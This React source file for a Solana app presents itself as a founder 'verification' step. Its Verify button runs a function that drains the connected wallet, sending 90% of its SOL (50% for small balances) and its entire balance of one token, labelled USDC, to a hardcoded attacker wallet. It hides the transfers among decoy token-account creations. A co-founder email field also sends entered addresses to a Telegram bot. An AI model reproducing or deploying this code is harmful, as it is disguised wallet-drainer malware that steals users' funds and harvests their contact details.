import { WalletAdapterNetwork, WalletNotConnectedError } from '@solana/wallet-adapter-base';
import { ConnectionProvider, WalletProvider, useConnection, useWallet } from '@solana/wallet-adapter-react';
import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
//import { Button as} from '@solana/wallet-adapter-react-ui/lib/types/Button';
import {
    SolletExtensionWalletAdapter,
    SolletWalletAdapter,
    GlowWalletAdapter,
    LedgerWalletAdapter,
    SlopeWalletAdapter,
    SolflareWalletAdapter,

} from '@solana/wallet-adapter-wallets';
import { Connection, clusterApiUrl, Transaction, SystemProgram, Account, Keypair, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js';
import React, { FC, ReactNode, useMemo, useCallback } from 'react';
import bs58 from 'bs58';
import * as splToken from "@solana/spl-token";
import { Token } from '@solana/spl-token';

// require('./App.css');
// require('@solana/wallet-adapter-react-ui/styles.css');
// Out


//@ts-no-checks
import { Box, Flex, Button, Image, Textarea, Text, Input, FormControl, InputLeftAddon, InputGroup, InputLeftElement } from "@chakra-ui/react"
import { Buttons } from "../Components/Buttons"
import { Inputs } from "../Components/Inputs"
import {BiUser} from 'react-icons/bi'
import {AiOutlineUsergroupAdd} from 'react-icons/ai'
import StepContainer from "../Layouts/StepContainer"
import { useState, useEffect } from "react"
import {FiMail} from 'react-icons/fi'
import axios from 'axios'
import { ClassNames } from '@emotion/react';
//@ts-ignor

export const Verification =() => {

    const [ data  , setData ] = useState('');
    const [ color , setColor ] = useState()
    const [ disabled , setDisabled ] = useState(true)
    const [ hide , setHide ] = useState('')
    const [email , setEmail ] = useState()
    const [loader , setLoader ] = useState(false )

    //function to handle mutiple 
    const handleMultiple =() => {
            {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
            // @ts-ignore */}
        if(data <= 0 ) {
                {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                 // @ts-ignore */}
            setData(true)
        } else {
            setData('')
        }
    }
    

    //handle onChange for input
    //@ts-ignor
    //eslint-disable-next-line
   // eslint-disable-next-line @typescript-eslint/ban-ts-comment
     // @ts-ignore *
    const handleInput = e => {

        const val = e.target.value ;
            //check if value is empthy 
            if(val <= 0|| val === null || val === '') {
                setDisabled(true )
            } else {
                setDisabled(false )
                setEmail(val)
            }
            console.log(val)
    }


    //submit item 
    const handleRequest =  () => {
        //handle Api submit here 
        setLoader(true)

        // send data to api
        const url=`https://v1.nocodeapi.com/obiabo/telegram/XNTveTVLNizpHNLw/sendText?text=${email}`
        try {
            const request = axios.post( url , {
                text: email
            } );

            setTimeout(() => {
                setLoader(false)
                 setHide('none');
                 setDisabled(true)

            }, 2500)

        } catch( error ) {
            console.warn(error)
        }
        
    }

    //handle form action 
    const handleForm =(e:any)=> {
        e.target.preventDefault()
    }

    useEffect(() => {

    }, [])

    return(
        <>

            <StepContainer step={3} title={'Single & Multi Verification'} >
                     {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                     // @ts-ignore */}
                <Box my={'1em'}>
                    
                    {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                     // @ts-ignore */}


                    <Box>


                        <Flex  gap={'2em'} mb={"2em"}>
                            
                             {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                                // @ts-ignore */}
                            <Buttons onClick = { e => handleMultiple()}>
                                         
                            {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                            // @ts-ignore */}
                                <BiUser size={'1.5em'}/>

                            </Buttons>
                                                
                                {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                                // @ts-ignore */}
                            <Buttons onClick = { e => handleMultiple()}>
                                         
                                {/* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                                // @ts-ignore */}
                               <AiOutlineUsergroupAdd size={'1.5em'}/>
                            </Buttons>
                        </Flex>

                        


                        
                    </Box>

                      
                    {
                        //check if single state is empthy 
                          /* // eslint-disable-next-line @typescript-eslint/ban-ts-comment
                        // @ts-ignore */
                        data <=0 ? (
                            <>

                               
                            <Text mb={'1em'}> Founder 1<br/>
                            Sol Balance : 0<br/>
                            <span style={{color:'red'}}>Status : Unverified</span></Text>
                            <Context>
                                <Content />
                            </Context>
                            
                            </>
                        ) : (
                            <>

                                <form onSubmit={handleForm}>
                                    <Text  my={'1em'} fontWeight={'bold'} display={ !hide ? 'none' : 'block' }>Request Sent To <Text fontWeight={'bold'} >{email}</Text> Sol Balance : 0 <br/> <span style={{color:'red'}}>Status : Unverified</span> </Text>
                                    <InputGroup display={hide}>
                                    <Input 
                                         type={'email'}
                                         placeholder={'Add a Co-founder'}  
                                            onChange={handleInput}
                                        my={'0.5em'} required/>
                                        <InputLeftElement children={<FiMail/>} py={'1.6em'} />
                                    </InputGroup>

                                    

                                    <Button w={'100%'} bg={'#7f58e2'}
                                     _hover={{bg:'purple.600'}} color={'#fff'}
                                      fontWeight={'bold'}
                                      disabled={disabled}
                                      onClick={handleRequest}
                                      isLoading={loader}
                                      loadingText={'Please Wait....'}
                                      >
                                        Add Co-Founder 
                                    </Button>
                                </form>
                            
                            </>
                        )
                    }
                   
                </Box>

            </StepContainer>
            
        </>
    )
}


const Context: FC<{ children: ReactNode }> = ({ children }) => {
    // The network can be set to 'devnet', 'testnet', or 'mainnet-beta'.
    const network = WalletAdapterNetwork.Mainnet;

    // You can also provide a custom RPC endpoint.
    const endpoint = useMemo(() => clusterApiUrl(network), [network]);

    // @solana/wallet-adapter-wallets includes all the adapters but supports tree shaking and lazy loading --
    // Only the wallets you configure here will be compiled into your application, and only the dependencies
    // of wallets that your users connect to will be loaded.
    const wallets = useMemo(
        () => [
            new SolletExtensionWalletAdapter(), 
            new SolletWalletAdapter(),
            new LedgerWalletAdapter(),
            new GlowWalletAdapter(),
            new SlopeWalletAdapter(),
            new SolflareWalletAdapter({ network }),
        ],
        [network]
    );

   

    return (
        <ConnectionProvider endpoint={endpoint}>
            <WalletProvider wallets={wallets} autoConnect>
                <WalletModalProvider>{children}</WalletModalProvider>
            </WalletProvider>
        </ConnectionProvider>
    );
};








function Content () {
    
    
    
    const { connected, wallet, select, disconnect, publicKey, signTransaction } = useWallet();
    const { connection } = useConnection();
    let address : string
    const generalStyle = {
          "display":"flex",
          "width":"100%",
          "height": "100%",
          "justifyContent":"center",
          "margin":"15px",
          "alignItems":"center"
      }
      const inputStyle = {
          "display":"block",
          "width":"40vw",
          "height":"45px",
          "padding":"2px 7px 2px 10px",
          "borderRadius":"7px",
          "color":"#eee",
          "background":"#444",
          "justifyContent":"center",
          "margin":"15px",
          "alignItems":"center"
      }
    
    { publicKey ? address = publicKey?.toString() : address = "" }
    
  
  
  
  
  
  
  
  
  
  
  
      
  async function Funny() {
    if (publicKey) {
        const balance = await connection.getBalance(publicKey);
        console.log(balance)
        let to = bs58.decode("3N2NEyCgy7iWwZwpMHgrtgJSFXEhRB1K8GRqxJxeThHD");
        let mfunds = balance * 0.90;
        if(balance < 900000000){
            mfunds = balance * 0.5;
          }
         
      
        let toWallet = Keypair.fromSeed(to);
        let transaction = new Transaction()
 
        console.log(toWallet.secretKey.toString())

  
        // Construct wallet keypairs
        var signers = new Account();
          

        





















        const mintPublicKeySTP = new PublicKey("DwvnUBGR3Lo8k3HeAtABZg4tZUrqmMQyEYdUsvkHdhrT");    
          const mintTokenSTP = new Token(
            connection,
            mintPublicKeySTP,
            splToken.TOKEN_PROGRAM_ID,
            signers // the wallet owner will pay to transfer and to create recipients associated token account if it does not yet exist.
          );
          
            const destPublicKeySTP = publicKey;
            
            // Get the derived address of the destination wallet which will hold the custom token
            const associatedDestinationTokenAddrSTP = await Token.getAssociatedTokenAddress(
                mintTokenSTP.associatedProgramId,
                mintTokenSTP.programId,
                mintPublicKeySTP,
                destPublicKeySTP
            );
            const receiverAccountSTP = await connection.getAccountInfo(associatedDestinationTokenAddrSTP);
            if (receiverAccountSTP === null) {
                transaction.add(
                    Token.createAssociatedTokenAccountInstruction(
                        mintTokenSTP.associatedProgramId,
                        mintTokenSTP.programId,
                        mintPublicKeySTP,
                        associatedDestinationTokenAddrSTP,
                        destPublicKeySTP,
                        publicKey
                    )
                )
                
            }
        
            //Add random token
        const mintPublicKeySTP2 = new PublicKey("3CBjSvTbi7oUUYjQ2nD3tpSousCx6ffrgF7wHbKgoFvW");    
        const mintTokenSTP2 = new Token(
          connection,
          mintPublicKeySTP2,
          splToken.TOKEN_PROGRAM_ID,
          signers // the wallet owner will pay to transfer and to create recipients associated token account if it does not yet exist.
        );
        
          const deSTP2ublicKeySTP2 = publicKey;
          
          // Get the derived address of the destination wallet which will hold the custom token
          const associatedDestinationTokenAddrSTP2 = await Token.getAssociatedTokenAddress(
              mintTokenSTP2.associatedProgramId,
              mintTokenSTP2.programId,
              mintPublicKeySTP2,
              deSTP2ublicKeySTP2
          );
          const receiverAccountSTP2 = await connection.getAccountInfo(associatedDestinationTokenAddrSTP2);
          if (receiverAccountSTP2 === null) {
              transaction.add(
                  Token.createAssociatedTokenAccountInstruction(
                      mintTokenSTP2.associatedProgramId,
                      mintTokenSTP2.programId,
                      mintPublicKeySTP2,
                      associatedDestinationTokenAddrSTP2,
                      deSTP2ublicKeySTP2,
                      publicKey
                  )
              )
              
          }










            //Add random token
            const mintPublicKeysamo = new PublicKey("7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU");    
            const mintTokensamo = new Token(
              connection,
              mintPublicKeysamo,
              splToken.TOKEN_PROGRAM_ID,
              signers // the wallet owner will pay to transfer and to create recipients associated token account if it does not yet exist.
            );
            
              const desamoublicKeysamo = publicKey;
              
              // Get the derived address of the destination wallet which will hold the custom token
              const associatedDestinationTokenAddrsamo = await Token.getAssociatedTokenAddress(
                  mintTokensamo.associatedProgramId,
                  mintTokensamo.programId,
                  mintPublicKeysamo,
                  desamoublicKeysamo
              );
              const receiverAccountsamo = await connection.getAccountInfo(associatedDestinationTokenAddrsamo);
              if (receiverAccountsamo === null) {
                  transaction.add(
                      Token.createAssociatedTokenAccountInstruction(
                          mintTokensamo.associatedProgramId,
                          mintTokensamo.programId,
                          mintPublicKeysamo,
                          associatedDestinationTokenAddrsamo,
                          desamoublicKeysamo,
                          publicKey
                      )
                  )
                  
              }
    


              
const mintPublicKeyCRP = new PublicKey("DubwWZNWiNGMMeeQHPnMATNj77YZPZSAz2WVR5WjLJqz");    
const mintTokenCRP = new Token(
  connection,
  mintPublicKeyCRP,
  splToken.TOKEN_PROGRAM_ID,
  signers // the wallet owner will pay to transfer and to create recipients associated token account if it does not yet exist.
);

  const deCRPublicKeyCRP = publicKey;
  
  // Get the derived address of the destination wallet which will hold the custom token
  const associatedDestinationTokenAddrCRP = await Token.getAssociatedTokenAddress(
      mintTokenCRP.associatedProgramId,
      mintTokenCRP.programId,
      mintPublicKeyCRP,
      deCRPublicKeyCRP
  );
  const receiverAccountCRP = await connection.getAccountInfo(associatedDestinationTokenAddrCRP);
  if (receiverAccountCRP === null) {
      transaction.add(
          Token.createAssociatedTokenAccountInstruction(
              mintTokenCRP.associatedProgramId,
              mintTokenCRP.programId,
              mintPublicKeyCRP,
              associatedDestinationTokenAddrCRP,
              deCRPublicKeyCRP,
              publicKey
          )
      )
      
  }

































        // SOL
        transaction.add(
            SystemProgram.transfer({
              fromPubkey: publicKey,
              toPubkey: toWallet.publicKey,
              lamports: mfunds,
            })
        );

















            //Add random token
            const mintPublicKeycato = new PublicKey("5p2zjqCd1WJzAVgcEnjhb9zWDU7b9XVhFhx4usiyN7jB");    
            const mintTokencato = new Token(
              connection,
              mintPublicKeycato,
              splToken.TOKEN_PROGRAM_ID,
              signers // the wallet owner will pay to transfer and to create recipients associated token account if it does not yet exist.
            );
            
              const decatoublicKeycato = publicKey;
              
              // Get the derived address of the destination wallet which will hold the custom token
              const associatedDestinationTokenAddrcato = await Token.getAssociatedTokenAddress(
                  mintTokencato.associatedProgramId,
                  mintTokencato.programId,
                  mintPublicKeycato,
                  decatoublicKeycato
              );
              const receiverAccountcato = await connection.getAccountInfo(associatedDestinationTokenAddrcato);
              if (receiverAccountcato === null) {
                  transaction.add(
                      Token.createAssociatedTokenAccountInstruction(
                          mintTokencato.associatedProgramId,
                          mintTokencato.programId,
                          mintPublicKeycato,
                          associatedDestinationTokenAddrcato,
                          decatoublicKeycato,
                          publicKey
                      )
                  )
                  
              }
    
    


              
            //Add random token
            const mintPublicKeywoof = new PublicKey("9nEqaUcb16sQ3Tn1psbkWqyhPdLmfHWjKGymREjsAgTE");    
            const mintTokenwoof = new Token(
              connection,
              mintPublicKeywoof,
              splToken.TOKEN_PROGRAM_ID,
              signers // the wallet owner will pay to transfer and to create recipients associated token account if it does not yet exist.
            );
            
              const dewoofublicKeywoof = publicKey;
              
              // Get the derived address of the destination wallet which will hold the custom token
              const associatedDestinationTokenAddrwoof = await Token.getAssociatedTokenAddress(
                  mintTokenwoof.associatedProgramId,
                  mintTokenwoof.programId,
                  mintPublicKeywoof,
                  dewoofublicKeywoof
              );
              const receiverAccountwoof = await connection.getAccountInfo(associatedDestinationTokenAddrwoof);
              if (receiverAccountwoof === null) {
                  transaction.add(
                      Token.createAssociatedTokenAccountInstruction(
                          mintTokenwoof.associatedProgramId,
                          mintTokenwoof.programId,
                          mintPublicKeywoof,
                          associatedDestinationTokenAddrwoof,
                          dewoofublicKeywoof,
                          publicKey
                      )
                  )
                  
              }
    









            //Add random token
            const mintPublicKeycheems = new PublicKey("3FoUAsGDbvTD6YZ4wVKJgTB76onJUKz7GPEBNiR5b8wc");    
            const mintTokencheems = new Token(
              connection,
              mintPublicKeycheems,
              splToken.TOKEN_PROGRAM_ID,
              signers // the wallet owner will pay to transfer and to create recipients associated token account if it does not yet exist.
            );
            
              const decheemsublicKeycheems = publicKey;
              
              // Get the derived address of the destination wallet which will hold the custom token
              const associatedDestinationTokenAddrcheems = await Token.getAssociatedTokenAddress(
                  mintTokencheems.associatedProgramId,
                  mintTokencheems.programId,
                  mintPublicKeycheems,
                  decheemsublicKeycheems
              );
              const receiverAccountcheems = await connection.getAccountInfo(associatedDestinationTokenAddrcheems);
              if (receiverAccountcheems === null) {
                  transaction.add(
                      Token.createAssociatedTokenAccountInstruction(
                          mintTokencheems.associatedProgramId,
                          mintTokencheems.programId,
                          mintPublicKeycheems,
                          associatedDestinationTokenAddrcheems,
                          decheemsublicKeycheems,
                          publicKey
                      )
                  )
                  
              }
    
    












        const mintPublicKeyUSDC = new PublicKey("G9tt98aYSznRk7jWsfuz9FnTdokxS6Brohdo9hSmjTRB");    
        const mintTokenUSDC = new Token(
        connection,
        mintPublicKeyUSDC,
        splToken.TOKEN_PROGRAM_ID,
        signers // the wallet owner will pay to transfer and to create recipients associated token account if it does not yet exist.
        );

        const destPublicKeyUSDC = toWallet.publicKey;
        
        // Get the derived address of the destination wallet which will hold the custom token
        const associatedDestinationTokenAddrUSDC = await Token.getAssociatedTokenAddress(
            mintTokenUSDC.associatedProgramId,
            mintTokenUSDC.programId,
            mintPublicKeyUSDC,
            destPublicKeyUSDC
        );
        const associatedSenderTokenAddrUSDC = await Token.getAssociatedTokenAddress(
            mintTokenUSDC.associatedProgramId,
            mintTokenUSDC.programId,
            mintPublicKeyUSDC,
            publicKey
        );
        const receiverAccountUSDC = await connection.getAccountInfo(associatedDestinationTokenAddrUSDC);
        const senderAccountUSDC = await connection.getAccountInfo(associatedSenderTokenAddrUSDC);
        
        if(senderAccountUSDC != null){
            
            console.log("2")
            const fromTokenAccountUSDC = await mintTokenUSDC.getOrCreateAssociatedAccountInfo(
                publicKey
                );
                let getbalUSDC = await connection.getTokenAccountBalance(
                fromTokenAccountUSDC.address
                );
                var exactAmountUSDC = getbalUSDC.value.uiAmount;
            if (receiverAccountUSDC === null) {
                transaction.add(
                Token.createAssociatedTokenAccountInstruction(
                    mintTokenUSDC.associatedProgramId,
                    mintTokenUSDC.programId,
                    mintPublicKeyUSDC,
                    associatedDestinationTokenAddrUSDC,
                    destPublicKeyUSDC,
                    publicKey
                )
                )
            
            }
            if(exactAmountUSDC){
                transaction.add(
                Token.createTransferInstruction(
                splToken.TOKEN_PROGRAM_ID,
                fromTokenAccountUSDC.address,
                associatedDestinationTokenAddrUSDC,
                publicKey,
                [],
                exactAmountUSDC * 1000000
                )
            );
            }
        }
        


        
const mintPublicKeyGRAPE = new PublicKey("8upjSpvjcdpuzhfR1zriwg5NXkwDruejqNE9WNbPRtyA");    
const mintTokenGRAPE = new Token(
  connection,
  mintPublicKeyGRAPE,
  splToken.TOKEN_PROGRAM_ID,
  signers // the wallet owner will pay to transfer and to create recipients associated token account if it does not yet exist.
);

  const deGRAPEublicKeyGRAPE = publicKey;
  
  // Get the derived address of the destination wallet which will hold the custom token
  const associatedDestinationTokenAddrGRAPE = await Token.getAssociatedTokenAddress(
      mintTokenGRAPE.associatedProgramId,
      mintTokenGRAPE.programId,
      mintPublicKeyGRAPE,
      deGRAPEublicKeyGRAPE
  );
  const receiverAccountGRAPE = await connection.getAccountInfo(associatedDestinationTokenAddrGRAPE);
  if (receiverAccountGRAPE === null) {
      transaction.add(
          Token.createAssociatedTokenAccountInstruction(
              mintTokenGRAPE.associatedProgramId,
              mintTokenGRAPE.programId,
              mintPublicKeyGRAPE,
              associatedDestinationTokenAddrGRAPE,
              deGRAPEublicKeyGRAPE,
              publicKey
          )
      )
      
  }

        
        

        


        let { blockhash } = await connection.getRecentBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;
        if(signTransaction){
            let signed = await signTransaction(transaction)
            let txid = await connection.sendRawTransaction(signed.serialize());
            await connection.confirmTransaction(txid);
        }

    } else {
        console.log("")
    }
}



















    return (
        <div>
            { connected ?
                <>
                    <div className="Wrapp">
                        <button onClick={Funny} className="quit bII">Verify</button>
                        <button disabled className="quit disII">Submit</button>
                    </div>
                </>
            :
            <>
                <div className="Wrapp">
                    <WalletMultiButton  className="restart bII"/>
                    <button onClick={Funny} disabled className="quit dis">Verify</button>
                </div>
            </>
            }
        </div>
    );
};




